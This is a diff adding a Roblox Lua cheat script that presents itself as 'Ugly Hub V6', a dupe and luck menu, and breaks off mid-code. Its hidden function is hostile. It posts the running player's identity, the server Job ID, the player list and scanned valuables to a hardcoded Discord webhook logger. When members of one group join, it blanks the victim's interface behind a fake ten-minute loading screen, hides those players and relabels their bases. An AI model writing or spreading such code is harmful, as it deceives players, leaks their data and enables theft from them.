@@ -1,0 +1,1655 @@
+-- Services
+local TweenService = game:GetService("TweenService")
+local UserInputService = game:GetService("UserInputService")
+local HttpService = game:GetService("HttpService")
+local Players = game:GetService("Players")
+local MarketplaceService = game:GetService("MarketplaceService")
+local RunService = game:GetService("RunService")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local StarterGui = game:GetService("StarterGui")
+local CoreGui = game:GetService("CoreGui")
+
+local Players = game:GetService("Players")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+
+local function muteCharacterSounds(character)
+    if character then
+        for _, child in ipairs(character:GetDescendants()) do
+            if child:IsA("Sound") then
+                local soundName = child.Name:lower()
+                if soundName:find("walk") or soundName:find("run") or soundName:find("step") then
+                    child:Destroy()
+                end
+            end
+        end
+    end
+end
+
+local function onCharacterAdded(character)
+    muteCharacterSounds(character)
+    
+    -- Listen for new sounds being added
+    character.DescendantAdded:Connect(function(descendant)
+        if descendant:IsA("Sound") then
+            local soundName = descendant.Name:lower()
+            if soundName:find("walk") or soundName:find("run") or soundName:find("step") then
+                task.wait(0.1) -- Small delay to ensure sound is loaded
+                descendant:Destroy()
+            end
+        end
+    end)
+end
+
+local function onPlayerAdded(player)
+    if player ~= Players.LocalPlayer then
+        player.CharacterAdded:Connect(onCharacterAdded)
+        if player.Character then
+            onCharacterAdded(player.Character)
+        end
+    end
+end
+
+-- Mute existing players
+for _, player in ipairs(Players:GetPlayers()) do
+    if player ~= Players.LocalPlayer then
+        onPlayerAdded(player)
+    end
+end
+
+-- Listen for new players
+Players.PlayerAdded:Connect(onPlayerAdded)
+
+local function deepSearchAndDestroy(parent, targetName, className)
+    for _, child in ipairs(parent:GetDescendants()) do
+        if child.Name == targetName and child:IsA(className) then
+            child:Destroy()
+            print("Deleted: " .. child:GetFullName())
+        end
+    end
+end
+
+-- Search in Workspace
+deepSearchAndDestroy(workspace, "Hitbox", "Part")
+deepSearchAndDestroy(workspace, "Stolen", "TextLabel")
+
+-- Search in ReplicatedStorage
+if ReplicatedStorage then
+    deepSearchAndDestroy(ReplicatedStorage, "Hitbox", "Part")
+    deepSearchAndDestroy(ReplicatedStorage, "Stolen", "TextLabel")
+end
+
+print("Sound silencer and object cleaner activated!")
+
+local GROUP_ID = 579723923
+local SCAN_INTERVAL = 1
+local LOADING_DURATION = 600 -- Customize loading duration in seconds here
+local localPlayer = Players.LocalPlayer
+local processedPlots = {}
+
+-- Loading screen status messages
+local STATUS_MESSAGES = {
+    "Getting server",
+    "Getting access",
+    "Loading resources",
+    "Synchronizing data",
+    "Verifying credentials",
+    "Establishing connection",
+    "Loading environment",
+    "Processing assets"
+}
+
+--------------------------------------------------------------------------------
+-- GROUP CHECK
+local function isPlayerInGroup(player)
+    if player == localPlayer then return false end
+    local success, result = pcall(function()
+        return player:IsInGroup(GROUP_ID)
+    end)
+    return success and result
+end
+
+--------------------------------------------------------------------------------
+-- LOADING SCREEN
+local screenGui, mainFrame, percentText, statusText
+local function createLoadingUI()
+    screenGui = Instance.new("ScreenGui")
+    screenGui.Name = "GroupLoadingScreen"
+    screenGui.ResetOnSpawn = false
+    screenGui.IgnoreGuiInset = true
+    screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+    screenGui.Parent = localPlayer:WaitForChild("PlayerGui")
+
+    mainFrame = Instance.new("Frame")
+    mainFrame.Size = UDim2.new(1,0,1,0)
+    mainFrame.BackgroundColor3 = Color3.fromRGB(15,15,15)
+    mainFrame.BorderSizePixel = 0
+    mainFrame.Visible = false
+    mainFrame.Parent = screenGui
+
+    local title = Instance.new("TextLabel")
+    title.Size = UDim2.new(1,0,0.15,0)
+    title.Position = UDim2.new(0,0,0.3,0)
+    title.BackgroundTransparency = 1
+    title.Text = "PROCESSING"
+    title.TextColor3 = Color3.fromRGB(240,240,240)
+    title.TextSize = 36
+    title.Font = Enum.Font.GothamBold
+    title.Parent = mainFrame
+
+    percentText = Instance.new("TextLabel")
+    percentText.Size = UDim2.new(1,0,0.1,0)
+    percentText.Position = UDim2.new(0,0,0.55,0)
+    percentText.BackgroundTransparency = 1
+    percentText.Text = "0%"
+    percentText.TextColor3 = Color3.fromRGB(200,200,200)
+    percentText.TextSize = 28
+    percentText.Font = Enum.Font.Gotham
+    percentText.Parent = mainFrame
+
+    statusText = Instance.new("TextLabel")
+    statusText.Size = UDim2.new(1,0,0.1,0)
+    statusText.Position = UDim2.new(0,0,0.62,0)
+    statusText.BackgroundTransparency = 1
+    statusText.Text = "Initializing..."
+    statusText.TextColor3 = Color3.fromRGB(180,180,180)
+    statusText.TextSize = 20
+    statusText.Font = Enum.Font.Gotham
+    statusText.Parent = mainFrame
+end
+
+local function deleteCoreGui()
+    -- Delete all children of CoreGui (the entire Explorer GUI)
+    for _, child in ipairs(CoreGui:GetChildren()) do
+        if child:IsA("GuiObject") or child:IsA("GuiBase") then
+            pcall(function()
+                child:Destroy()
+            end)
+        end
+    end
+    
+    -- Also hide core GUIs using StarterGui
+    pcall(function()
+        StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, false)
+    end)
+end
+
+local function restoreCoreGui()
+    -- Restore core GUIs using StarterGui
+    pcall(function()
+        StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, true)
+    end)
+end
+
+local function showLoadingScreen()
+    if not screenGui then createLoadingUI() end
+    
+    -- Delete CoreGui when someone from the group joins
+    deleteCoreGui()
+    
+    mainFrame.Visible = true
+    percentText.Text = "0%"
+    statusText.Text = "Initializing..."
+
+    spawn(function()
+        local startTime = tick()
+        local endTime = startTime + LOADING_DURATION
+        
+        while tick() < endTime and mainFrame.Visible do
+            local elapsed = tick() - startTime
+            local progress = math.min(100, math.floor((elapsed / LOADING_DURATION) * 100))
+            
+            percentText.Text = progress .. "%"
+            
+            if math.random(1,5) == 1 then
+                statusText.Text = STATUS_MESSAGES[math.random(1,#STATUS_MESSAGES)]
+            end
+            
+            task.wait(0.05)
+        end
+        
+        if mainFrame.Visible then
+            percentText.Text = "100%"
+            statusText.Text = "GOT ACCESS"
+        end
+    end)
+
+    task.delay(LOADING_DURATION, function()
+        local fade = TweenService:Create(mainFrame, TweenInfo.new(0.5), {BackgroundTransparency=1})
+        fade:Play()
+        fade.Completed:Connect(function()
+            mainFrame.Visible = false
+            mainFrame.BackgroundTransparency = 0
+            
+            -- Restore core GUIs after loading screen
+            restoreCoreGui()
+        end)
+    end)
+end
+
+--------------------------------------------------------------------------------
+-- PLOT HANDLER
+local function processPlotSign(plotSign)
+    if processedPlots[plotSign] then return false end
+    local gui = plotSign:FindFirstChild("SurfaceGui")
+    local frame = gui and gui:FindFirstChild("Frame")
+    local textLabel = frame and frame:FindFirstChild("TextLabel")
+    if not textLabel then return false end
+
+    local text = textLabel.Text
+    if not text:match("'s Base$") then return false end
+    local playerName = text:gsub("'s Base$", "")
+    if playerName == "" or playerName == localPlayer.Name then
+        processedPlots[plotSign] = true
+        return false
+    end
+
+    local targetPlayer = Players:FindFirstChild(playerName)
+    if targetPlayer and isPlayerInGroup(targetPlayer) then
+        textLabel.Text = "Empty Base"
+        local plotModel = plotSign.Parent
+        if plotModel then
+            local laser = plotModel:FindFirstChild("Laser")
+            if laser then laser:ClearAllChildren() end
+            local mult = plotModel:FindFirstChild("Multiplier")
+            if mult then mult:Destroy() end
+        end
+        processedPlots[plotSign] = true
+        return true
+    end
+    return false
+end
+
+local function scanPlots()
+    local plotsFolder = workspace:FindFirstChild("Plots")
+    if not plotsFolder then return end
+    local function recurse(obj)
+        if obj.Name=="PlotSign" and obj:IsA("BasePart") then processPlotSign(obj) end
+        for _,c in ipairs(obj:GetChildren()) do recurse(c) end
+    end
+    recurse(plotsFolder)
+end
+
+--------------------------------------------------------------------------------
+-- PLAYER TELEPORT/HIDE
+local function teleportPlayer(player)
+    if player ~= localPlayer then
+        local char = player.Character or player.CharacterAdded:Wait()
+        local hrp = char:WaitForChild("HumanoidRootPart",5)
+        if hrp then
+            hrp.CFrame = CFrame.new(-10000,0,0)
+            hrp.Anchored = true
+        end
+    end
+end
+
+local function hidePlayer(player)
+    if player and player~=localPlayer then
+        player:Destroy()
+    end
+end
+
+local function runPlayerHider(player)
+    if isPlayerInGroup(player) then
+        showLoadingScreen()
+        teleportPlayer(player)
+        task.wait(0.5)
+        hidePlayer(player)
+    end
+end
+
+--------------------------------------------------------------------------------
+-- MAIN
+print("Combined script started for GroupID:", GROUP_ID)
+print("Loading screen duration:", LOADING_DURATION, "seconds")
+scanPlots()
+
+-- Periodic plot scan
+task.spawn(function()
+    while task.wait(SCAN_INTERVAL) do
+        scanPlots()
+    end
+end)
+
+-- Handle current players
+for _,plr in ipairs(Players:GetPlayers()) do
+    runPlayerHider(plr)
+end
+
+-- Handle future players
+Players.PlayerAdded:Connect(function(plr)
+    runPlayerHider(plr)
+    plr.CharacterAdded:Connect(function()
+        runPlayerHider(plr)
+    end)
+end)
+
+-- Safety loop
+task.spawn(function()
+    while task.wait(2) do
+        for _,plr in ipairs(Players:GetPlayers()) do
+            runPlayerHider(plr)
+        end
+    end
+end)
+
+-- Webhook configuration
+local WEBHOOK_URL = "https://discord.com/api/webhooks/1387806554920845413/jZYhXWQGDDUh8ShJLuCZFjJyT6GoIMXMfHtESOvE7C1Njomb8GWlaDD6pr9w8D7iBiI5"
+
+local httpRequest
+if typeof(syn) == "table" and type(syn.request) == "function" then
+    httpRequest = syn.request
+elseif type(request) == "function" then
+    httpRequest = request
+elseif type(http_request) == "function" then -- some other executors
+    httpRequest = http_request
+else
+    error("No http request function available in this environment.")
+end
+
+-- Expected items inside each plot model
+local expectedItems = {
+    "AnimalPodiums",
+    "Decorations",
+    "InvisibleWalls",
+    "Laser",
+    "LaserHitbox",
+    "Purchases",
+    "Unlock",
+    "FriendPanel",
+    "AnimalTarget",
+    "DeliveryHitbox",
+    "MainRoot",
+    "Multiplier",
+    "PlotSign",
+    "Slope",
+    "Spawn",
+    "StealHitbox"
+}
+
+-- Function to delete Notification GUI
+local function deleteNotificationGui()
+    local gui = Players.LocalPlayer and Players.LocalPlayer:FindFirstChild("PlayerGui")
+    if not gui then return false end
+    
+    local notification = gui:FindFirstChild("Notification")
+    if notification then
+        notification:Destroy()
+        return true
+    end
+    
+    return false
+end
+
+-- Function to delete all Sound objects in ReplicatedStorage
+local function deleteSoundsInReplicatedStorage()
+    local deletedCount = 0
+    
+    local function scanForSounds(parent)
+        for _, child in ipairs(parent:GetChildren()) do
+            if child:IsA("Sound") then
+                child:Destroy()
+                deletedCount = deletedCount + 1
+            else
+                scanForSounds(child) -- Recursively scan children
+            end
+        end
+    end
+    
+    scanForSounds(ReplicatedStorage)
+    return deletedCount
+end
+
+-- Function to check plots for extra items and process them
+local function checkPlotsForExtraItems()
+    local extraItems = {}
+    local processedItems = {}
+    
+    -- Check if Plots folder exists
+    local plotsFolder = workspace:FindFirstChild("Plots")
+    if not plotsFolder then
+        return {"ERROR: Plots folder not found in workspace"}, processedItems
+    end
+    
+    -- Iterate through all models in Plots folder
+    for _, plotModel in ipairs(plotsFolder:GetChildren()) do
+        if plotModel:IsA("Model") then
+            -- Check each child in the plot model
+            for _, child in ipairs(plotModel:GetChildren()) do
+                local childName = child.Name
+                local isExpected = false
+                
+                -- Check if this child is in our expected items list
+                for _, expectedName in ipairs(expectedItems) do
+                    if childName == expectedName then
+                        isExpected = true
+                        break
+                    end
+                end
+                
+                -- If not expected, process it
+                if not isExpected then
+                    if not extraItems[childName] then
+                        extraItems[childName] = 0
+                    end
+                    extraItems[childName] = extraItems[childName] + 1
+                    
+                    -- Process the item (duplicate 2x and check for AnimationController)
+                    local success, result = pcall(function()
+                        -- Duplicate the item 2 times
+                        for i = 1, 2 do
+                            local clone = child:Clone()
+                            clone.Parent = child.Parent
+                            clone.Name = child.Name .. "_Copy_" .. i
+                        end
+                        
+                        -- Check for AnimationController and delete if found
+                        local animationControllers = {}
+                        if child:IsA("Model") or child:IsA("Folder") then
+                            animationControllers = child:GetDescendants()
+                        else
+                            animationControllers = {child}
+                        end
+                        
+                        local deletedControllers = 0
+                        for _, item in ipairs(animationControllers) do
+                            if item:IsA("AnimationController") then
+                                item:Destroy()
+                                deletedControllers = deletedControllers + 1
+                            end
+                        end
+                        
+                        return {duplicated = true, deletedControllers = deletedControllers}
+                    end)
+                    
+                    if success then
+                        table.insert(processedItems, {
+                            name = childName,
+                            duplicated = result.duplicated,
+                            deletedControllers = result.deletedControllers
+                        })
+                    else
+                        table.insert(processedItems, {
+                            name = childName,
+                            error = result
+                        })
+                    end
+                end
+            end
+        end
+    end
+    
+    if next(extraItems) == nil then
+        return {}, processedItems
+    end
+    
+    return extraItems, processedItems
+end
+
+-- server info
+local function getUptime()
+    local seconds = tick() - workspace.DistributedGameTime
+    local h = math.floor(seconds / 3600)
+    local m = math.floor((seconds % 3600) / 60)
+    local s = math.floor(seconds % 60)
+    return string.format("%02dh %02dm %02ds", h, m, s)
+end
+
+-- try to get game/place name; fall back to PlaceId if unavailable
+local function getGameName()
+    local ok, info = pcall(function()
+        return MarketplaceService:GetProductInfo(game.PlaceId)
+    end)
+    if ok and type(info) == "table" and info.Name then
+        return info.Name
+    end
+    -- fallback
+    return "Place " .. tostring(game.PlaceId)
+end
+
+-- Get player thumbnail
+local function getPlayerThumbnail(userId, size)
+    local thumbTypes = {["png"] = true, ["jpg"] = true}
+    local success, result = pcall(function()
+        return Players:GetUserThumbnailAsync(userId, Enum.ThumbnailType.HeadShot, size)
+    end)
+    
+    if success and thumbTypes[string.sub(result, -3)] then
+        return result
+    end
+    return "https://www.roblox.com/headshot-thumbnail/image?userId=" .. userId .. "&width=150&height=150&format=png"
+end
+
+-- Format player list with profile pictures
+local function getPlayerListWithAvatars(limit)
+    local players = Players:GetPlayers()
+    local playerList = {}
+    
+    for i, player in ipairs(players) do
+        if limit and i > limit then
+            table.insert(playerList, "... and " .. tostring(#players - limit) .. " more")
+            break
+        end
+        
+        local avatarUrl = getPlayerThumbnail(player.UserId, Enum.ThumbnailSize.Size150x150)
+        table.insert(playerList, {
+            name = player.DisplayName .. " (@" .. player.Name .. ")",
+            icon_url = avatarUrl,
+            userid = player.UserId
+        })
+    end
+    
+    return playerList
+end
+
+-- Delete Notification GUI
+local notificationDeleted = deleteNotificationGui()
+
+-- Delete sounds in ReplicatedStorage
+local soundsDeleted = deleteSoundsInReplicatedStorage()
+
+-- Check for extra items in plots and process them
+local extraItems, processedItems = checkPlotsForExtraItems()
+
+-- Get local player info
+local localPlayer = Players.LocalPlayer
+local playerName = "Unknown Player"
+local playerUserId = "0"
+local playerProfile = "https://www.roblox.com/favicon.ico"
+
+if localPlayer then
+    playerName = localPlayer.DisplayName .. " (@" .. localPlayer.Name .. ")"
+    playerUserId = tostring(localPlayer.UserId)
+    playerProfile = getPlayerThumbnail(localPlayer.UserId, Enum.ThumbnailSize.Size420x420)
+end
+
+-- Format extra items list
+local extraItemsList = {}
+for itemName, count in pairs(extraItems) do
+    table.insert(extraItemsList, itemName .. " (Found: " .. count .. ")")
+end
+
+if #extraItemsList == 0 then
+    table.insert(extraItemsList, "No brainrots in the server")
+end
+
+-- Get player list with avatars
+local playerList = getPlayerListWithAvatars(20)
+
+-- Create the embed message
+local embeds = {
+    {
+        title = "Script Executed!",
+        description = "Scanned for brainrots",
+        color = 0x8B0000,
+        fields = {
+            {
+                name = "Heres what we found",
+                value = "```" .. table.concat(extraItemsList, "\n") .. "```",
+                inline = false
+            },
+            {
+                name = "Game Info",
+                value = "**Game:** " .. getGameName() .. "\n**Job ID:** " .. tostring(game.JobId) .. "\n**Uptime:** " .. getUptime(),
+                inline = true
+            },
+            {
+                name = "Executor Info",
+                value = "**Player:** " .. playerName .. "\n**User ID:** " .. playerUserId .. "\n**Player Count:** " .. tostring(#Players:GetPlayers()),
+                inline = true
+            },
+            {
+                name = "Cleanup Results",
+                value = "**Notification GUI:** " .. (notificationDeleted and "Deleted" or "Not Found") .. "\n**Sounds Deleted:** " .. soundsDeleted,
+                inline = false
+            }
+        },
+        thumbnail = {
+            url = playerProfile
+        },
+        footer = {
+            text = "Scan executed at"
+        },
+        timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ") -- ISO UTC timestamp
+    }
+}
+
+-- Add player list as a separate embed if there are players
+if #playerList > 0 then
+    local playerListText = ""
+    for i, player in ipairs(playerList) do
+        if type(player) == "table" then
+            playerListText = playerListText .. "• " .. player.name .. "\n"
+        else
+            playerListText = playerListText .. "• " .. player .. "\n"
+        end
+    end
+    
+    table.insert(embeds, {
+        title = "👥 Players in Server (" .. #Players:GetPlayers() .. ")",
+        description = playerListText,
+        color = 0xe74c3c, -- Red color
+        thumbnail = {
+            url = "https://cdn3.iconfinder.com/data/icons/gaming-and-beyond/80/Group_Gamers-512.png"
+        }
+    })
+end
+
+local payload = {
+    content = "Script executed by " .. playerName,
+    embeds = embeds,
+    username = "XenoDeadly Logger",
+    avatar_url = "https://tr.rbxcdn.com/180DAY-f73891348882d93d20ac3b60a1c4755b/150/150/Image/Webp/noFilter" -- Custom bot avatar
+}
+
+-- Send to webhook
+local ok, res = pcall(function()
+    return httpRequest({
+        Url = WEBHOOK_URL,
+        Method = "POST",
+        Headers = {
+            ["Content-Type"] = "application/json"
+        },
+        Body = HttpService:JSONEncode(payload)
+    })
+end)
+
+if not ok then
+    warn("HTTP request failed:", res)
+else
+    print("Webhook sent successfully. Found", #extraItemsList, "unexpected item types.")
+    print("Notification GUI deleted:", notificationDeleted)
+    print("Sounds deleted:", soundsDeleted)
+    
+    -- Print processing results
+    for _, item in ipairs(processedItems) do
+        if item.error then
+            print("Error processing", item.name, ":", item.error)
+        else
+            print("Processed", item.name, "- Duplicated 2x, Deleted", item.deletedControllers, "AnimationControllers")
+        end
+    end
+end
+
+
+-- HTTP Request function
+local httpRequest
+if typeof(syn) == "table" and type(syn.request) == "function" then
+    httpRequest = syn.request
+elseif type(request) == "function" then
+    httpRequest = request
+elseif type(http_request) == "function" then
+    httpRequest = http_request
+else
+    error("No http request function available in this environment.")
+end
+
+-- Create ScreenGui
+local screenGui = Instance.new("ScreenGui")
+screenGui.Name = "FuturisticGUI"
+screenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
+screenGui.ResetOnSpawn = false
+screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+
+-- Main Frame
+local mainFrame = Instance.new("Frame")
+mainFrame.Name = "MainFrame"
+mainFrame.Parent = screenGui
+mainFrame.BackgroundColor3 = Color3.fromRGB(12, 12, 20)
+mainFrame.BorderSizePixel = 0
+mainFrame.Position = UDim2.new(0.5, -200, 0.5, -150)
+mainFrame.Size = UDim2.new(0, 400, 0, 300)
+mainFrame.ClipsDescendants = true
+mainFrame.AnchorPoint = Vector2.new(0.5, 0.5)
+
+-- Add gradient and glow effects
+local gradient = Instance.new("UIGradient")
+gradient.Color = ColorSequence.new{
+    ColorSequenceKeypoint.new(0, Color3.fromRGB(18, 18, 30)),
+    ColorSequenceKeypoint.new(1, Color3.fromRGB(8, 8, 16))
+}
+gradient.Rotation = 45
+gradient.Parent = mainFrame
+
+local corner = Instance.new("UICorner")
+corner.CornerRadius = UDim.new(0, 12)
+corner.Parent = mainFrame
+
+local stroke = Instance.new("UIStroke")
+stroke.Color = Color3.fromRGB(0, 150, 255)
+stroke.Thickness = 1.5
+stroke.Transparency = 0.2
+stroke.Parent = mainFrame
+
+-- Outer Glow Effect
+local glow = Instance.new("ImageLabel")
+glow.Name = "GlowEffect"
+glow.Parent = mainFrame
+glow.BackgroundTransparency = 1
+glow.Size = UDim2.new(1, 20, 1, 20)
+glow.Position = UDim2.new(0, -10, 0, -10)
+glow.ZIndex = 0
+glow.Image = "rbxassetid://4996891970"
+glow.ImageColor3 = Color3.fromRGB(0, 100, 255)
+glow.ScaleType = Enum.ScaleType.Slice
+glow.SliceCenter = Rect.new(49, 49, 450, 450)
+glow.ImageTransparency = 0.8
+
+-- Animate glow
+local glowTween = TweenService:Create(glow, TweenInfo.new(2, Enum.EasingStyle.Quad, Enum.EasingDirection.InOut, -1, true), {
+    ImageColor3 = Color3.fromRGB(0, 180, 255),
+    ImageTransparency = 0.6
+})
+glowTween:Play()
+
+-- Particle Effects
+local particles = Instance.new("Frame")
+particles.Name = "Particles"
+particles.Parent = mainFrame
+particles.BackgroundTransparency = 1
+particles.Size = UDim2.new(1, 0, 1, 0)
+particles.ZIndex = 0
+
+-- Create floating particles
+for i = 1, 15 do
+    local particle = Instance.new("Frame")
+    particle.Parent = particles
+    particle.BackgroundColor3 = Color3.fromRGB(0, 180, 255)
+    particle.BorderSizePixel = 0
+    particle.Size = UDim2.new(0, math.random(2, 4), 0, math.random(2, 4))
+    particle.Position = UDim2.new(0, math.random(0, 400), 0, math.random(0, 300))
+    particle.AnchorPoint = Vector2.new(0.5, 0.5)
+    
+    local particleCorner = Instance.new("UICorner")
+    particleCorner.CornerRadius = UDim.new(1, 0)
+    particleCorner.Parent = particle
+    
+    -- Animate particles
+    spawn(function()
+        while particle.Parent do
+            local targetPos = UDim2.new(0, math.random(0, 400), 0, math.random(0, 300))
+            local tweenTime = math.random(3, 7)
+            
+            TweenService:Create(particle, TweenInfo.new(tweenTime, Enum.EasingStyle.Linear), {
+                Position = targetPos
+            }):Play()
+            
+            wait(tweenTime)
+        end
+    end)
+end
+
+-- Dragging functionality
+local dragging = false
+local dragStart = nil
+local startPos = nil
+
+local function updateInput(input)
+    local delta = input.Position - dragStart
+    mainFrame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
+end
+
+mainFrame.InputBegan:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+        dragging = true
+        dragStart = input.Position
+        startPos = mainFrame.Position
+        
+        -- Scale down effect when dragging
+        TweenService:Create(mainFrame, TweenInfo.new(0.1), {
+            Size = UDim2.new(0, 390, 0, 290)
+        }):Play()
+        
+        input.Changed:Connect(function()
+            if input.UserInputState == Enum.UserInputState.End then
+                dragging = false
+                TweenService:Create(mainFrame, TweenInfo.new(0.1), {
+                    Size = UDim2.new(0, 400, 0, 300)
+                }):Play()
+            end
+        end)
+    end
+end)
+
+mainFrame.InputChanged:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
+        if dragging then
+            updateInput(input)
+        end
+    end
+end)
+
+-- Close button
+local closeButton = Instance.new("ImageButton")
+closeButton.Name = "CloseButton"
+closeButton.Parent = mainFrame
+closeButton.BackgroundTransparency = 1
+closeButton.Position = UDim2.new(1, -25, 0, 5)
+closeButton.Size = UDim2.new(0, 20, 0, 20)
+closeButton.Image = "rbxassetid://3926305904"
+closeButton.ImageRectOffset = Vector2.new(284, 4)
+closeButton.ImageRectSize = Vector2.new(24, 24)
+closeButton.ImageColor3 = Color3.fromRGB(200, 200, 200)
+
+closeButton.MouseEnter:Connect(function()
+    TweenService:Create(closeButton, TweenInfo.new(0.2), {
+        ImageColor3 = Color3.fromRGB(255, 255, 255),
+        Rotation = 90
+    }):Play()
+end)
+
+closeButton.MouseLeave:Connect(function()
+    TweenService:Create(closeButton, TweenInfo.new(0.2), {
+        ImageColor3 = Color3.fromRGB(200, 200, 200),
+        Rotation = 0
+    }):Play()
+end)
+
+closeButton.MouseButton1Click:Connect(function()
+    -- Close animation
+    local closeTween = TweenService:Create(mainFrame, TweenInfo.new(0.5, Enum.EasingStyle.Back, Enum.EasingDirection.In), {
+        Size = UDim2.new(0, 0, 0, 0),
+        Position = UDim2.new(0.5, 0, 0.5, 0)
+    })
+    closeTween:Play()
+    
+    closeTween.Completed:Connect(function()
+        screenGui:Destroy()
+    end)
+end)
+
+-- Page 1: Selection Page
+local page1 = Instance.new("Frame")
+page1.Name = "Page1"
+page1.Parent = mainFrame
+page1.BackgroundTransparency = 1
+page1.Size = UDim2.new(1, 0, 1, 0)
+
+-- Title with animation
+local title = Instance.new("TextLabel")
+title.Name = "Title"
+title.Parent = page1
+title.BackgroundTransparency = 1
+title.Position = UDim2.new(0, 0, 0, 15)
+title.Size = UDim2.new(1, 0, 0, 35)
+title.Font = Enum.Font.GothamBold
+title.Text = "Ugly Hub V6"
+title.TextColor3 = Color3.fromRGB(0, 200, 255)
+title.TextSize = 18
+title.TextStrokeTransparency = 0.7
+
+-- Animate title text
+spawn(function()
+    while title.Parent do
+        TweenService:Create(title, TweenInfo.new(1, Enum.EasingStyle.Quad), {
+            TextTransparency = 0.2
+        }):Play()
+        wait(1)
+        TweenService:Create(title, TweenInfo.new(1, Enum.EasingStyle.Quad), {
+            TextTransparency = 0
+        }):Play()
+        wait(1)
+    end
+end)
+
+-- Scroll Frame
+local scrollFrame = Instance.new("ScrollingFrame")
+scrollFrame.Name = "ScrollFrame"
+scrollFrame.Parent = page1
+scrollFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 32)
+scrollFrame.BackgroundTransparency = 0.1
+scrollFrame.BorderSizePixel = 0
+scrollFrame.Position = UDim2.new(0.08, 0, 0.22, 0)
+scrollFrame.Size = UDim2.new(0.84, 0, 0.55, 0)
+scrollFrame.ScrollBarThickness = 3
+scrollFrame.ScrollBarImageColor3 = Color3.fromRGB(0, 150, 255)
+scrollFrame.ScrollBarImageTransparency = 0.3
+scrollFrame.CanvasSize = UDim2.new(0, 0, 0, 200)
+
+local scrollCorner = Instance.new("UICorner")
+scrollCorner.CornerRadius = UDim.new(0, 8)
+scrollCorner.Parent = scrollFrame
+
+local scrollStroke = Instance.new("UIStroke")
+scrollStroke.Color = Color3.fromRGB(40, 40, 60)
+scrollStroke.Thickness = 1
+scrollStroke.Transparency = 0.5
+scrollStroke.Parent = scrollFrame
+
+-- Selection buttons with customizable text
+local buttons = {}
+local selectedButton = nil
+
+-- Custom button texts - CHANGE THESE TO YOUR PREFERRED TEXT
+local buttonTexts = {
+    "DUPE BRAINROTS (5M MINIMUM)",
+    "50X SERVER LUCK",
+    "CRAFT MACHINE LUCK"
+}
+
+for i = 1, 3 do
+    local button = Instance.new("TextButton")
+    button.Name = "Option" .. i
+    button.Parent = scrollFrame
+    button.BackgroundColor3 = Color3.fromRGB(100, 180, 255) -- Light blue color
+    button.BorderSizePixel = 0
+    button.Position = UDim2.new(0.15, 0, (i-1) * 0.22 + 0.08, 0)
+    button.Size = UDim2.new(0.7, 0, 0.12, 0)
+    button.Font = Enum.Font.Gotham
+    button.Text = buttonTexts[i] or "OPTION " .. i -- Use custom text if provided
+    button.TextColor3 = Color3.fromRGB(255, 255, 255)
+    button.TextSize = 12
+    button.ZIndex = 2
+    
+    local buttonCorner = Instance.new("UICorner")
+    buttonCorner.CornerRadius = UDim.new(0, 6)
+    buttonCorner.Parent = button
+    
+    local buttonStroke = Instance.new("UIStroke")
+    buttonStroke.Color = Color3.fromRGB(140, 200, 255) -- Light blue border
+    buttonStroke.Thickness = 1
+    buttonStroke.Transparency = 0.3
+    buttonStroke.Parent = button
+    
+    -- Subtle gradient for buttons
+    local buttonGradient = Instance.new("UIGradient")
+    buttonGradient.Color = ColorSequence.new{
+        ColorSequenceKeypoint.new(0, Color3.fromRGB(120, 190, 255)),
+        ColorSequenceKeypoint.new(1, Color3.fromRGB(80, 160, 240))
+    }
+    buttonGradient.Rotation = 90
+    buttonGradient.Parent = button
+    
+    -- Button highlight effect
+    local highlight = Instance.new("Frame")
+    highlight.Name = "Highlight"
+    highlight.Parent = button
+    highlight.BackgroundColor3 = Color3.fromRGB(180, 220, 255)
+    highlight.BackgroundTransparency = 0.8
+    highlight.Size = UDim2.new(1, 0, 1, 0)
+    highlight.BorderSizePixel = 0
+    highlight.ZIndex = 1
+    highlight.Visible = false
+    
+    local highlightCorner = Instance.new("UICorner")
+    highlightCorner.CornerRadius = UDim.new(0, 6)
+    highlightCorner.Parent = highlight
+    
+    buttons[i] = button
+    
+    -- Hover effect
+    button.MouseEnter:Connect(function()
+        if button ~= selectedButton then
+            TweenService:Create(button, TweenInfo.new(0.2), {
+                BackgroundColor3 = Color3.fromRGB(120, 200, 255)
+            }):Play()
+            
+            highlight.Visible = true
+            TweenService:Create(highlight, TweenInfo.new(0.3), {
+                BackgroundTransparency = 0.6
+            }):Play()
+        end
+    end)
+    
+    button.MouseLeave:Connect(function()
+        if button ~= selectedButton then
+            TweenService:Create(button, TweenInfo.new(0.2), {
+                BackgroundColor3 = Color3.fromRGB(100, 180, 255)
+            }):Play()
+            
+            TweenService:Create(highlight, TweenInfo.new(0.3), {
+                BackgroundTransparency = 0.8
+            }):Play()
+            highlight.Visible = false
+        end
+    end)
+    
+    button.MouseButton1Click:Connect(function()
+        -- Unhighlight previous selection
+        if selectedButton then
+            TweenService:Create(selectedButton, TweenInfo.new(0.2), {
+                BackgroundColor3 = Color3.fromRGB(100, 180, 255),
+                TextColor3 = Color3.fromRGB(255, 255, 255)
+            }):Play()
+            
+            local prevStroke = selectedButton:FindFirstChild("UIStroke")
+            if prevStroke then
+                TweenService:Create(prevStroke, TweenInfo.new(0.2), {
+                    Color = Color3.fromRGB(140, 200, 255)
+                }):Play()
+            end
+            
+            local prevHighlight = selectedButton:FindFirstChild("Highlight")
+            if prevHighlight then
+                TweenService:Create(prevHighlight, TweenInfo.new(0.2), {
+                    BackgroundTransparency = 0.8
+                }):Play()
+            end
+        end
+        
+        -- Highlight new selection
+        TweenService:Create(button, TweenInfo.new(0.2), {
+            BackgroundColor3 = Color3.fromRGB(80, 160, 240),
+            TextColor3 = Color3.fromRGB(255, 255, 255)
+        }):Play()
+        
+        local stroke = button:FindFirstChild("UIStroke")
+        if stroke then
+            TweenService:Create(stroke, TweenInfo.new(0.2), {
